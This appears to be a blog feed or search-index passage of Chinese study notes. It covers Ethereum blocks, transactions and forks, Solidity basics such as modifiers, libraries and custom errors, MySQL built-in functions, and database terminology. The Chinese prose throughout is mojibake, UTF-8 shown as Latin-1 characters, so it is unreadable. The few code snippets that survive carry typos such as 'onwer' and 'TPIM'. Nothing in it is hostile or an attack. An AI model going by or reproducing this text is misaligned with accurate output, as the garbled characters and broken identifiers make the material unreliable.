‡ï¼ˆè¡¨ç¤ºæŒ–çŸ¿çš„éš¾åº¦ï¼‰</p></blockquote><blockquote><p>åŒºå—ä½“ï¼šåŒ…å«äº†è¿™ä¸ªåŒºå—çš„æ‰€æœ‰äº¤æ˜“å“ˆå¸Œå€¼</p></blockquote><p>8ï¼Œä»¥ä»¥å¤ªåŠä¸ºä¾‹ï¼šä»ä¸Šåˆ°ä¸‹åˆ†ä¸ºï¼šåŒºå—é“¾ï¼ŒåŒºå—ï¼Œäº¤æ˜“</p><blockquote><p>äº¤æ˜“ï¼šä¸€ä¸ªè´¦æˆ·å‘å¦ä¸€ä¸ªè´¦æˆ·å‘é€ä¿¡æ¯çš„è¡Œä¸ºï¼Œå½“å‘èµ·äº¤æ˜“æ—¶ï¼Œä»¥å¤ªåŠå®¢æˆ·ç«¯æˆ–è€…é’±åŒ…ä¼šç”Ÿæˆäº¤æ˜“æ•°æ®.äº¤æ˜“æ•°æ®åŒ…æ‹¬ï¼šnonce(å‘é€æ–¹çš„äº¤æ˜“æ•°é‡)ï¼ŒgasPrice(å‘é€æ–¹æ„¿æ„æ”¯ä»˜çš„gasè´¹ç”¨)ï¼ŒgasLimit(å‘é€æ–¹è®¾ç½®æœ¬æ¬¡æœ€å¤§çš„gasè´¹ç”¨)ï¼Œto(æ¥æ”¶æ–¹çš„åœ°å€)ï¼Œvalue(è¦å‘é€çš„é’±)ï¼Œdata(æ™ºèƒ½åˆçº¦çš„å­—èŠ‚ç )ï¼Œv r s (äº¤æ˜“çš„ç­¾åï¼Œåˆå‘é€æ–¹çš„ç§é’¥äº§ç”Ÿ)<br>9ï¼Œè½¯ç¡¬åˆ†å‰ï¼šä»å­—é¢ä¸Šç†è§£ï¼Œå°±æ˜¯ä¸€ä¸ªå¦¥åï¼Œä¸€ä¸ªå¼ºç¡¬ï¼ŒåŒºå—é“¾ä¸Šçš„è½¯ç¡¬åˆ†å‰æ­£æ˜¯å› ä¸ºæ—¶ä»£çš„æ›´æ–°ï¼Œé“¾ä¸Šå‡ºç°äº†åˆ†æ­§ï¼Œé‚£ä¹ˆå¦‚ä½•è§£å†³å‘¢ï¼Œè¿™æ˜¯å°±å‡ºç°äº†åˆ†å‰ï¼Œä»é¡¹ç›®ä¸Šæ¥è¯´ï¼Œä¸€ä¸ªé¡¹ç›®çš„åˆ†å‰ï¼ˆforkï¼‰ï¼Œåˆ†ä¸ºä¸€ä¸ªå­é¡¹ç›®ï¼Œé‚£ä¹ˆå¼€å‘äººå‘˜å°±ä¼šåˆ†åˆ«è¿›è¡Œè¿™ä¿©ä¸ªé¡¹ç›®ï¼Œä½†æ˜¯åŒºå—é“¾ä¸Šï¼Œå°±ä¸åŒï¼Œå°±å‡ºç°äº†ä¿©ç§æ¦‚å¿µ</p></blockquote><ul><li>è½¯åˆ†å‰ï¼šå‘å‰å…¼å®¹ï¼Œæ—§ç‰ˆæœ¬æ¥å—æ–°ç‰ˆæœ¬çš„ä¸œè¥¿ï¼Œä½†æ˜¯åœ¨æ—§ç‰ˆæœ¬çš„ç®—åŠ›è¦å¤§äº51%ï¼Œæ‰èƒ½äº§ç”Ÿè½¯åˆ†å‰ï¼Œæœ€åé“¾æ¯”è¾ƒé•¿çš„ä¿ç•™</li><li>ç¡¬åˆ†å‰ï¼šä¸å…¼å®¹ï¼Œæ—§ç‰ˆæœ¬å’Œæ–°ç‰ˆæœ¬æ˜¯å®Œå…¨åˆ†å¼€çš„ï¼Œå®ƒä¸éœ€è¦ç®—åŠ›å¤§äº51%ï¼ˆå› ä¸ºå³ä½¿æ—§ç‰ˆæœ¬çš„é“¾é•¿äºæ–°ç‰ˆæœ¬ï¼Œä½†æ˜¯ä¹Ÿä¸å½±å“æ–°ç‰ˆæœ¬ï¼Œå› ä¸ºæ–°ç‰ˆæœ¬ä¸ä¼šæ¥å—æ—§ç‰ˆæœ¬çš„ä¸œè¥¿ï¼Œè€Œæ—§ç‰ˆæœ¬å¤œä¹Ÿä¸ä¼šæ¥å—æ–°ç‰ˆæœ¬çš„ä¸œè¥¿ï¼‰,ç›´æ¥äº§ç”Ÿç¡¬åˆ†å‰</li></ul><h2 id="äºŒï¼Œsolidityçš„çŸ¥è¯†æŸ¥æ¼è¡¥ç¼º"><a href="#äºŒï¼Œsolidityçš„çŸ¥è¯†æŸ¥æ¼è¡¥ç¼º" class="headerlink" title="äºŒï¼Œsolidityçš„çŸ¥è¯†æŸ¥æ¼è¡¥ç¼º"></a>äºŒï¼Œsolidityçš„çŸ¥è¯†æŸ¥æ¼è¡¥ç¼º</h2><p>1ï¼Œæˆ‘æ„Ÿè§‰å­¦äº†Javaçš„è¯ä¼šå¾ˆå¥½ç†è§£ã€‚<br>2ï¼Œä½¿ç”¨ç»“æ„ä½“æ—¶ï¼Œé‡‡ç”¨å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¦‚æœå¯¹è±¡å¾ˆå¤šï¼Œå°±é‡‡ç”¨åŠ¨æ€æ•°ç»„ï¼Œè¿™æ ·å°±æ¯”è¾ƒæ–¹ä¾¿<br>  eg,å®šä¹‰ä¸€ä¸ªåPersonçš„ç»“æ„ä½“ï¼Œç”¨Person[] list_of_people ,é‚£ä¹ˆlist_of_peopleæ•°ç»„å°±å¯ä»¥å‚¨å­˜å¤šä¸ªPersonå¯¹è±¡<br>3ï¼Œæ³¨æ„åˆ°äº†ä¸€ä¸ªæ™ºèƒ½é—®ç­”å°åŠ©æ‰‹ï¼Œåä¸º<a href="https://www.phind.com/search?home=true">phind</a>,å°±æ˜¯å¯ä»¥ç”¨å®ƒæ¥æ£€æŸ¥ä½ çš„åˆçº¦æ˜¯å¦ç¼ºé€—å·é—®é¢˜å•¥çš„<br>4ï¼Œæ•°æ®å‚¨å­˜ï¼šcalldataï¼Œå®ƒæ˜¯åªèƒ½è¯»ï¼Œä¸èƒ½è°ƒç”¨ä½¿ç”¨ã€‚ä½†æ˜¯åœ¨åˆçº¦ä¸­å†…å­˜memoryå¯ä»¥å…è®¸è¯»å†™ï¼Œè®©å˜é‡æ”¹å˜åœ¨å‡½æ•°ä¸­ï¼Œä¸ºäº†ä¿®æ”¹calldataæˆ‘ä»¬å¿…é¡»å…ˆå°†å®ƒå‚¨å­˜åˆ°å†…å­˜memoryä¸­ã€‚calldataå’Œmemoryï¼Œéƒ½æ˜¯ä¸´æ—¶å‚¨å­˜å˜é‡ã€‚Storageå‚¨å­˜å˜é‡ï¼Œå®ƒæ˜¯æŒä¹…çš„å‚¨å­˜åœ¨åŒºå—é“¾ä¸Šï¼Œè¢«å¤–éƒ¨è°ƒç”¨æ—¶ä¼šä¿ç•™å®ƒä»¬çš„å€¼ï¼Œä»»ä½•åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡éƒ½ä¼šéšå¼çš„è½¬åŒ–å‚¨å­˜å˜é‡ï¼Œä½†æ˜¯ä¸èƒ½åœ¨å‡½æ•°ä¸­å®šä¹‰ä½¿ç”¨Storage,åªèƒ½ä½¿ç”¨calldataå’Œmemoryã€‚<br>5ï¼Œæ˜ å°„ï¼Œåœ¨å‰é¢æˆ‘ä»¬ä¹Ÿäº†è§£åˆ°ï¼Œç”¨åŠ¨æ€æ•°ç»„å‚¨å­˜Personå¯¹è±¡ï¼Œä½†æ˜¯å¦‚æœæœ‰å¾ˆå¤šå¯¹è±¡ï¼Œè€Œæˆ‘ä»¬è¦æ‰¾å…¶ä¸­ä¸€ä¸ªï¼Œå°±å¿…é¡»ä»å¤´å†éï¼Œè¿™æ ·å°±ä¼šä½·éº»çƒ¦ï¼Œæ‰€ä»¥å°±å‡ºç°äº†æ˜ å°„ï¼Œæ„é€ ä¸€ä¸ªæ˜ å°„å¯¹è±¡ï¼Œå°†ä¸€ä¸ªå˜é‡å’Œå¦ä¸€ä¸ªå˜é‡è”ç³»èµ·æ¥ï¼Œæä¾›å™¶æˆ‘ä»¬çš„æŸ¥æ‰¾æ•ˆç‡<br>6ï¼Œåˆçº¦å®ä¾‹éƒ¨ç½²ï¼Œä½¿ç”¨newå…³é”®å­—ï¼Œç±»ä¼¼äºjavaçš„ç†è§£ã€‚é¦–å…ˆä½ å°†è¦éƒ¨ç½²çš„åˆçº¦Aå’Œæˆ‘ä»¬çš„å·¥å‚åˆçº¦Bæ”¾åœ¨ä¸€èµ·ï¼Œç„¶ååœ¨å·¥å‚åˆçº¦Bä¸­ç”¨Aå®šä¹‰aï¼Œå†å®šä¹‰ä¸€ä¸ªå‡½æ•°createï¼Œé‡Œé¢å†™a&#x3D;new A();è¿™æ ·ä¸€ä¸ªåˆçº¦å®ä¾‹å°±éƒ¨ç½²å‡ºæ¥äº†ï¼Œæ²¡ä½¿ç”¨createçš„æ—¶å€™ï¼Œå¯ä»¥çœ‹è§açš„åœ°å€ä¸º0ï¼Œä½¿ç”¨åå°±å¯ä»¥å‘ç°aå°±æœ‰åœ°å€äº†ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯ï¼Œæˆ‘ä»¬æŠŠåˆçº¦Aéƒ¨ç½²å‡ºæ¥äº†ï¼Œè¿˜æœ‰ä¸€ç§ç®€å•çš„æ–¹æ³•ï¼Œé‡‡ç”¨importå…³é”®å­—ï¼Œè¿™æ ·å°±å¯ä»¥ä¸ç”¨æŠŠåˆçº¦Aå’Œåˆçº¦Bå†™åœ¨ä¸€èµ·äº†ï¼Œç›´æ¥å°±æ˜¯improtâ€.&#x2F;Aâ€</p><blockquote><p>importçš„ä½¿ç”¨æ–¹æ³•ï¼šå¦‚æœè¦å¯¼å…¥çš„åˆçº¦åªåŒ…å«ä¸€ä¸ªåˆçº¦ï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨ importâ€.&#x2F;â€œ,å¦‚æœæ˜¯è¦å¯¼å…¥çš„åˆçº¦ä¸­åŒ…æ‹¬å¾ˆå¤šç§åˆçº¦ï¼Œç„¶åä½ è¦ä½¿ç”¨å“ªç§åˆçº¦ï¼Œå°±åœ¨{}é‡Œå†™ï¼Œåœ¨â€ â€œå†™æ¥æºï¼Œå°±æ˜¯å¤§åˆçº¦ï¼Œimport {A,B} from â€œ.&#x2F;Aâ€;</p></blockquote><p>7ï¼Œç»§æ‰¿äºé‡å†™ï¼šä¿©ä¸ªå…³é”®å­— overrideï¼Œvirtualï¼Œä¾‹å¦‚A is B{}ï¼›Aåˆçº¦ç»§æ‰¿Båˆçº¦ï¼Œæˆ‘ä»¬è¦ä¿®æ”¹Aä¸­ç»§æ‰¿Båˆçº¦çš„å‡½æ•°ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å°±è¦åœ¨Aåˆçº¦ä¸­è¦ä¿®æ”¹çš„å‡½æ•°åŠ ä¸Šoverrideå…³é”®å­—ï¼Œåœ¨Båˆçº¦è¢«ä¿®æ”¹çš„å‡½æ•°ä¸­åŠ ä¸Švritualå…³é”®å­—ï¼Œè¿™æ ·å°±ä¸ä¼šæŠ¥é”™<br>8ï¼Œä¸€ä¸ªå¯ä»¥è®¡ç®—ï¼Œwei,Gwei,Ether,ä¹‹é—´çš„è½¬åŒ–çš„å·¥å…·ï¼š<a href="https://eth-converter.com/">Converter</a>;<br>9,gas:äº¤æ˜“æ‰€äº§ç”Ÿçš„æ‰‹æœ¯è´¹ï¼Œå¦‚æœä¸€ä¸ªäº¤æ˜“è¢«revertäº†ï¼Œé‚£ä¹ˆå®ƒçš„gaså°±ä¸ä¼šè¿”å›ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä»¥å¤ªåŠå°±æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œè‡ªå·±è®¾ç½®èƒ½æ‰¿æ‹…çš„æœ€å¤§gasè´¹ç”¨<br>10ï¼Œåº“ï¼šçœŸçš„æ˜¯æŸ¥æ¼è¡¥ç¼ºäº†ï¼Œè¿™ä¸ªåº“ï¼Œæˆ‘è¿˜æ˜¯ç¬¬ä¸€æ¬¡äº†è§£åˆ°ï¼Œåº“å°±æ˜¯ä¸ºäº†ç®€åŒ–æ™ºèƒ½åˆçº¦ï¼Œä½¿ç”¨Libraryå…³é”®å­—ï¼Œå®šä¹‰ä¸€ä¸ªMathçš„åº“ï¼ŒLibrary Math{};é‡Œé¢å°±æ”¾å‡½æ•°ï¼Œåœ¨å…¶ä»–åˆçº¦ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨åº“.å‡½æ•°åï¼Œç›´æ¥è¿›è¡Œè°ƒç”¨ï¼Œæˆ–è€…ä½¿ç”¨use for ,ä¾‹å¦‚è¦åœ¨åˆçº¦ä¸­uintç±»å‹çš„å˜é‡å¯ä»¥ä½¿ç”¨Mathåº“ï¼Œå°±ç›´æ¥use Math for uint;è¿™æ ·åˆçº¦ä¸­çš„uintç±»å‹çš„å˜é‡å°±å¯ä»¥ä½¿ç”¨Mathåº“ä¸­çš„å‡½æ•°ï¼Œuintç±»å‹.å‡½æ•°åï¼Œï¼ˆæ³¨æ„çš„å…ˆä½¿ç”¨importå¯¼å…¥åº“ï¼‰<br>11ï¼Œæ³¨æ„åˆçº¦çš„solidityçš„ç‰ˆæœ¬ï¼Œåœ¨0.6ç‰ˆæœ¬æ—¶ï¼Œæ²¡æœ‰å¯¹æº¢å‡ºçš„ä¸€ä¸ªæ£€æŸ¥ï¼Œä½†æ˜¯ä½¿ç”¨SafeMath.solå¯ä»¥å¯¹å®ƒè¿›è¡Œæ£€æŸ¥ã€‚åœ¨solidityç‰ˆæœ¬0.8ä»¥ä¸Šæ—¶ï¼Œå®ƒæœ‰æ£€æŸ¥ä¸Šæº¢å’Œä¸‹æº¢çš„åŠŸèƒ½ï¼Œæ‰€ä»¥å°±ä¸éœ€è¦ä½¿ç”¨SafeMath.sol<br>12,é‡ç½®é˜µåˆ—ï¼šä½¿ç”¨newå…³é”®å­—ï¼Œå³å°†æ¯ä¸ªå…ƒç´ éƒ½é‡ç½®ä¸ºé›¶ï¼Œä¾‹å¦‚ï¼šfouder &#x3D; new address<a href=""></a>;è¿˜æœ‰ä¸€ç§delete.ç›´æ¥åˆ é™¤å˜é‡çš„å€¼<br>13ï¼Œmodifier:ä¿®é¥°å™¨ï¼Œå¦‚æœåˆçº¦è¾ƒé•¿ï¼Œè€Œæˆ‘ä»¬åˆå¿…é¡»æ¯ä¸ªæ£€æŸ¥åˆçº¦çš„æ‰€æœ‰è€…ï¼Œä½¿ç”¨requireçš„è¯ä¼šå¾ˆç¹æ‚ï¼Œæ‰€ä»¥å°±æœ‰ä¿®é¥°å™¨äº†ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modifier onlyOwner&#123;</span><br><span class="line">  require(msg.sender == onwer,&quot;Sender is not owner&quot;);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œæœ‰ä¸ª_,å¦‚æœå‡½æ•°ä½¿ç”¨äº†onlyOwnerçš„ä¿®é¥°ç¬¦ï¼Œé‚£ä¹ˆå°±ä¼šå…ˆæ‰§è¡Œ_ä»¥å‰çš„ä»£ç ï¼Œå¦‚æœæˆåŠŸï¼Œå†æ‰§è¡Œå‡½æ•°ä¸­çš„ä»£ç <br>14ï¼Œè‡ªå®šä¹‰é”™è¯¯ï¼šä»solidityçš„0.8.4å¼€å§‹ï¼Œå¼•å…¥äº†è‡ªå®šä¹‰çš„é”™è¯¯ï¼Œç”¨äºèŠ‚çœGaså¹¶æé«˜æ›´åŠ å…·ä½“çš„é”™è¯¯ä¿¡æ¯ï¼Œrevertç”¨äºæ‰‹åŠ¨è§¦å‘å¼‚å¸¸ï¼Œä¾‹å¦‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdraw (uint amount )&#123;</span><br><span class="line">  if(amount&gt;balance)&#123;</span><br><span class="line">    revert (&quot;Insufficient Balance&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè‡ªå®šä¹‰é”™è¯¯ï¼Œç”¨äºæä¾›æ›´è¯¦ç»†å’ŒèŠ‚çœGasçš„é”™è¯¯ä¿¡æ¯ï¼Œä¾‹å¦‚:error InsufficientBalance(uint requested,uint available);ä½¿ç”¨çš„æ—¶å€™ç”¨revertå³å¯ï¼šrevert InsufficientBalance(requested:amount,available:balance);<br>15ï¼Œreceive(): é€‚ç”¨äºåˆçº¦ä¸­æœ‰å®ƒï¼Œä¸”æ²¡æœ‰msg.dataçš„å­˜åœ¨ï¼Œè€Œfallback()å°±æ˜¯ç›¸å<br>16ï¼Œä¸€äº›æœ‰ç”¨çš„å°åŠ©æ‰‹<br><a href="https://chatgpt.com/">ChatGPT</a>;<br>è°·æ­Œå¼€å‘çš„ä¸€ä¸ªæ™ºèƒ½è½¯ä»¶ï¼š<a href="https://gemini.google.com/app">Gemini</a>ï¼›<br>ä¸€ä¸ªç¤¾åŒºçš„æ£€ç´¢é—®é¢˜ï¼š<a href="https://ethereum.stackexchange.com/">Ethereum-Stack-Exchange</a><br>ä¸€ä¸ªç¤¾åŒºçš„å…¨çƒäº¤æµå¹³å°ï¼š<a href="https://stackoverflow.com/">stackoverflow</a>;<br>webä¸€ä¸ªçŸ¥è¯†æ„å»ºå¹³å°ï¼š<a href="https://www.peeranha.io/get-started">Peerhana</a>;</p>]]></content>
      
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&#39;æ•°æ®åº“åŸç†åŠåº”ç”¨è¿›é˜¶&#39;</title>
      <link href="/2024/09/18/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E8%BF%9B%E9%98%B6/"/>
      <url>/2024/09/18/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿›é˜¶"><a href="#è¿›é˜¶" class="headerlink" title="è¿›é˜¶"></a>è¿›é˜¶</h1><h2 id="MySQLå†…ç½®å‡½æ•°"><a href="#MySQLå†…ç½®å‡½æ•°" class="headerlink" title="MySQLå†…ç½®å‡½æ•°"></a>MySQLå†…ç½®å‡½æ•°</h2><p>ä¸€ï¼Œå«ä¹‰ï¼šæ˜¯æŒ‡ä¸€æ®µå¯ä»¥ç›´æ¥è¢«å¦ä¸€æ®µç¨‹åºè°ƒç”¨çš„ç¨‹åºæˆ–ä»£ç </p><p>äºŒï¼Œåˆ†ç±»ï¼š</p><ul><li><p>å­—ç¬¦ä¸²å‡½æ•° ï¼ˆä½¿ç”¨æ—¶ï¼Œå‰é¢åŠ selectï¼‰eg,select concatï¼ˆâ€™heâ€™,â€™DEâ€™ï¼‰</p><ul><li>CONCATï¼ˆS1,S2,S3ï¼‰ï¼šå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå°†S1,S2,S3æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²</li><li>LOWERï¼ˆstrï¼‰ï¼šå°†å­—ç¬¦ä¸²strå…¨éƒ¨è½¬åŒ–ä¸ºå°å†™</li><li>UPPER(str) : å°†å­—ç¬¦ä¸²strå…¨éƒ¨è½¬åŒ–ä¸ºå¤§å†™</li><li>LPADï¼ˆstr,n,padï¼‰:å·¦å¡«å……ï¼Œç”¨å­—ç¬¦ä¸²padå¯¹strçš„å·¦è¾¹è¿›è¡Œå¡«å……ï¼Œè¾¾åˆ°nä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦</li><li>RPAD (str,n,pad) :å³å¡«å……ï¼Œç”¨å­—ç¬¦ä¸²padå¯¹strçš„å³è¾¹è¿›è¡Œå¡«å……ï¼Œè¾¾åˆ°nä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦</li><li>TPIMï¼ˆstrï¼‰ï¼šå»æ‰å­—ç¬¦ä¸²å¤´éƒ¨å’Œå°¾éƒ¨çš„ç©ºæ ¼</li><li>SUBSTRING(str,start,len):è¿”å›ä»å­—ç¬¦ä¸²strä»startä½ç½®èµ·çš„lenä¸ªé•¿åº¦çš„å­—ç¬¦ä¸²</li><li>ä¾‹å¦‚ï¼Œå¦‚æœè¦å•ä¸ªå·¥å·å‰é¢æ·»åŠ 0000ï¼Œå°±ä½¿ç”¨update è¡¨å set workno &#x3D; lpad(workno,5,â€™0â€™)</li></ul></li><li><p>æ•°å€¼å‡½æ•°</p><ul><li>CEIL(x):å‘ä¸Šå–æ•´</li><li>FLOORï¼ˆxï¼‰:å‘ä¸‹å–æ•´</li><li>MOD (x,y): è¿”å›x&#x2F;yçš„æ¨¡</li><li>RANDï¼ˆï¼‰ï¼šè¿”å›0-1å†…çš„éšæœºæ•°</li><li>ROUNDï¼ˆx,yï¼‰ï¼šæ±‚xå››èˆäº”å…¥çš„å€¼ï¼Œæš´éœ²yä½å°æ•°   </li><li>ä¾‹å¦‚éšæœºç”Ÿæˆä¸€ä¸ª6ä½æ•°çš„éªŒè¯ç ï¼Œselect lpadï¼ˆround(rand()<em>1000000,0)ï¼Œ6ï¼Œâ€™0â€™ï¼‰,é¦–å…ˆè¿›è¡Œç”Ÿæˆ0-1çš„éšæœºæ•°ï¼Œç„¶åä¹˜ä»¥1000000å°±å˜æˆäº†ä¸€ä¸ªå…­ä½æ•°å¸¦æœ‰å°æ•°çš„æ•°ï¼Œåœ¨ç”¨roundï¼ˆï¼‰å››èˆäº”å…¥æ¶ˆé™¤å°æ•°ï¼Œæ³¨æ„ï¼Œå¦‚æœæ˜¯0.012345</em>1000000å°±ä¼šåªæœ‰5ä½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œå¡«å……ï¼Œä½¿ç”¨lpadæˆ–è€…rpadéƒ½å¯ä»¥</li></ul></li><li><p>æ—¥æœŸå‡½æ•°</p><ul><li>CURDATE()ï¼šè¿”å›å½“å‰æ—¥æœŸ</li><li>CURTIME(): è¿”å›å½“å‰æ—¶é—´</li><li>NOW(): è¿”å›å½“å‰æ—¥æœŸå’Œæ—¶é—´</li><li>YEAR(date)ï¼šè·å–æŒ‡å®šdateçš„å¹´ä»½</li><li>MONTH(date): è·å–æŒ‡å®šdateçš„æœˆä»½</li><li>DAYï¼ˆdateï¼‰ï¼šè·å–æŒ‡å®šdateçš„æ—¥æœŸ</li><li>DATE_ADD(date,INTERVAL expr type):è¿”å›ä¸€ä¸ªæ—¥æœŸ&#x2F;æ—¶é—´å€¼åŠ ä¸Šä¸€ä¸ªæ—¶é—´é—´éš”expråçš„æ—¶é—´å€¼</li><li>DATEDIFF(date1,date2):è¿”å›èµ·å§‹æ—¶é—´date1,å’Œç»“æŸæ—¶é—´date2ä¹‹é—´çš„å¤©æ•°</li><li>ä¾‹å¦‚ï¼Œä»å½“å‰æ—¥æœŸå¾€åæ¨70å¤©ï¼Œselect date_add(now(),INTERVAL 70 DAY);æŸ¥è¯¢å‘˜å·¥å…¥èŒçš„å¤©æ•°å¹¶é™åºæ’åºï¼Œselect name datediff(curdate(),entrydate) as â€˜entrydaysâ€™ from è¡¨ order by entrydays desc;ä½¿ç”¨datediffå‡½æ•°ï¼Œä¸ºäº†æ–¹ä¾¿æ’åºï¼Œç”¨as ç»™è®¡ç®—çš„å¤©æ•°èµ·ä¸ªåˆ«åï¼Œæ–¹ä¾¿order by ä½¿ç”¨</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®åº“åŸç†åŠåº”ç”¨åŸºç¡€</title>
      <link href="/2024/09/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2024/09/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="æœ¯è¯­"><a href="#æœ¯è¯­" class="headerlink" title="æœ¯è¯­"></a>æœ¯è¯­</h2><p>1ï¼Œæ•°æ®æ˜¯æ•°æ®åº“å‚¨å­˜çš„åŸºæœ¬å¯¹è±¡ï¼Œè€Œæ•°æ®åº“åˆ™æ˜¯é•¿æœŸå‚¨å­˜åœ¨è®¡ç®—æœºä¸­ï¼Œæœ‰ç»„ç»‡ï¼Œå¯å…±äº«çš„å¤§é‡æ•°æ®çš„é›†åˆ<br>   åŸºæœ¬ç‰¹ç‚¹ï¼šæ°¸ä¹…å‚¨å­˜ï¼Œæœ‰ç»„ç»‡ï¼Œå¯å…±äº«ï¼Œå†—ä½™åº¦å°ï¼Œæ˜“æ‰©å±•<br>2ï¼Œä¸€äº›åŸºæœ¬æ¨¡å‹æœ¯è¯­ï¼š</p><ul><li>å…³ç³»ï¼ˆrï¼‰ï¼šå°±æ˜¯ä¸€ä¸ªæ•´ä½“çš„è¡¨ï¼Œå¯å¯¹å…³ç³»çš„æè¿°:å…³ç³»å (å±æ€§1ï¼Œå±æ€§2â€¦..)ï¼›å…³ç³»åå°±æ˜¯è¡¨åï¼›<ul><li>å…³ç³»å®Œæ•´æ€§çº¦æŸæ¡ä»¶ï¼šå®ä½“ï¼Œå‚ç…§ï¼Œç”¨æˆ·å®šä¹‰å®Œæ•´æ€§</li></ul></li><li>å±æ€§ï¼šè¡¨ä¸­çš„ä¸€åˆ—ä¸ºä¸€ä¸ªå±æ€§</li><li>åŸŸï¼šå±æ€§çš„å–å€¼èŒƒå›´ï¼Œä¸€ä¸ªå…·æœ‰ç›¸åŒç±»å‹çš„å€¼é›†åˆ</li><li>å…ƒç»„ï¼ˆtï¼‰ï¼šè¡¨ä¸­çš„ä¸€è¡Œ</li><li>ä¸»ç ï¼šä¹Ÿå«ç é”®ï¼Œè¡¨ä¸­çš„æŸä¸ªå±æ€§ç»„ï¼Œå®ƒå¯ä»¥å”¯ä¸€ç¡®å®šä¸€ä¸ªå…ƒç»„ï¼Œå°±æ˜¯ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šå¯ä»¥ç”¨å®ƒæ¥ç¡®å®šå”¯ä¸€çš„å€¼ï¼Œæœ‰ç‚¹ç±»ä¼¼äºcä¸­çš„æŒ‡é’ˆï¼›</li><li>åˆ†é‡ï¼šå…ƒç»„ä¸­çš„ä¸€ä¸ªå±æ€§å€¼</li><li>å…³ç³»æ¨¡å¼ï¼šå¯¹å…³ç³»çš„æè¿°ï¼Œä¹Ÿå«è”ç³»<br>3ï¼Œæ•°æ®åº“ç³»ç»Ÿé‡Œæœ‰ä¸‰ç§æ¨¡å¼ï¼š<br>a,æ¨¡å¼ï¼ˆé€»è¾‘æ¨¡å¼ï¼Œæ¦‚å¿µæ¨¡å¼ï¼‰ï¼šæ•°æ®åº“ä¸­çš„å…¨ä½“æ•°æ®é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿°ï¼Œä¸ç‰©ç†å‚¨å­˜çš„ç»†èŠ‚å’Œç¡¬ä»¶ç¯å¢ƒï¼Œä¸å…·ä½“çš„åº”ç”¨ç¨‹åºï¼Œå¼€å‘ç¯å¢ƒåŠé«˜çº§ç¨‹åºè®¾è®¡è¯­è¨€æ— å…³ï¼Œå®ƒæ˜¯æ•°æ®åº“ç³»ç»Ÿæ¨¡å¼çš„ä¸­é—´å±‚<br>bï¼Œå¤–æ¨¡å¼ï¼ˆå­æ¨¡å¼ï¼Œç”¨æˆ·æ¨¡å¼ï¼‰ï¼šæ•°æ®åº“ç”¨æˆ·ä½¿ç”¨çš„å±€éƒ¨æ•°æ®çš„é€»è¾‘ç»“æ„å’Œç‰¹å¾çš„æè¿°ï¼Œæ˜¯ä¸æŸä¸€åº”ç”¨æœ‰å…³çš„æ•°æ®çš„é€»è¾‘è¡¨ç¤ºï¼Œ<strong>æ¯ä¸ªç”¨æˆ·</strong>åªèƒ½çœ‹è§å’Œè®¿é—®å¯¹åº”çš„å¤–æ¨¡å¼ä¸­çš„æ•°æ®ï¼Œç”¨æˆ·åªèƒ½ä¸å¤–æ¨¡å¼å»ºç«‹è”ç³»<br>cï¼Œå†…æ¨¡å¼ï¼ˆå‚¨å­˜æ¨¡å¼ï¼Œç‰©ç†æ¨¡å¼ï¼‰ï¼šæ˜¯æ•°æ®ç‰©ç†ç»“æ„å’Œå‚¨å­˜æ–¹å¼çš„æè¿°ï¼Œæ˜¯æ•°æ®åœ¨æ•°æ®åº“å†…éƒ¨çš„è¡¨ç¤ºæ–¹å¼ï¼šè®°å½•çš„å‚¨å­˜æ–¹å¼ï¼Œç´¢å¼•çš„ç»„ç»‡æ–¹å¼ï¼Œæ•°æ®æ˜¯å¦å‹ç¼©å‚¨å­˜ï¼Œæ•°æ®æ˜¯å¦åŠ å¯†ï¼Œæ•°æ®å‚¨å­˜è®°å½•è®°å½•ç»“æ„çš„è§„å®š<blockquote><p>ç”¨æˆ·-å¤–æ¨¡å¼-æ¨¡å¼-å†…æ¨¡å¼</p></blockquote></li></ul><p>4ï¼ŒäºŒçº§æ˜ åƒï¼Œä¸‰çº§æ¨¡å¼<br>4ï¼Œ<strong>E-Rå›¾</strong>ï¼šå®ä½“ç”¨æ–¹æ¡†ï¼Œå±æ€§ç”¨æ¤­åœ†ï¼Œå…³ç³»ç”¨è±å½¢</p><hr><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="åŸºæœ¬å«ä¹‰ï¼š"><a href="#åŸºæœ¬å«ä¹‰ï¼š" class="headerlink" 